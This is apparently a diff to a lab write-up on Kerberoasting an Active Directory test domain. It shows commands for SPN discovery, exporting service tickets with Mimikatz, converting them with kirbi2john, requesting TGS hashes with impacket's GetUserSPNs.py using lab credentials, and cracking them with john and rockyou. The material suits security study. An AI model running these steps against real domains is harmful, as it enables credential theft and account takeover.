@@ -62,7 +62,7 @@ Find-PotentiallyCrackableAccounts -FullData -Verbose
 <img src="/img/kerberosting/12.png" alt="Getting-gz" width="1000" height="200"> 
 
 
-## GetUserSPNs.ps1
+## 2-GetUserSPNs.ps1
 ```
 download script: https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1
 ```
@@ -84,8 +84,9 @@ download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-T
  
 <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="1000" height="200"> 
 
- ## Mimikatz
- 
+ ## 3-Mimikatz
+SPN discovery
+
 <img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ```
@@ -104,7 +105,9 @@ kerberos::list /export
 <img src="/img/kerberosting/m3.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
-## kirbi2john.py 
+## kirbi2john.py
+I copied TGS  ticked to my kali machine  and use kirbi2john from john 
+
 Convert the Kirbi to Hash 
 ```
 kirbi2john.py 3-40a50000-admin@ldap\~domainAD.karim.net\~DomainDnsZones.karim.net-KARIM.NET.kirbi
@@ -113,6 +116,8 @@ kirbi2john.py 3-40a50000-admin@ldap\~domainAD.karim.net\~DomainDnsZones.karim.ne
 <img src="/img/kerberosting/222222.PNG" alt="Getting-gz" width="1000" height="300"> 
  
 ## GetUserSPNs.py
+I used GetUserSPNs from  impacket collection to discover spn from a remote machine 
+
 find user account used as service account
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 
@@ -134,12 +139,14 @@ sudo ntpdate  192.168.128.140
 
 <img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+Dumping ticket hashes
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-user websvc
 ```
   
 <img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="1000" height="300"> 
-  
+
+crack hash with john
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt tgs
 ```
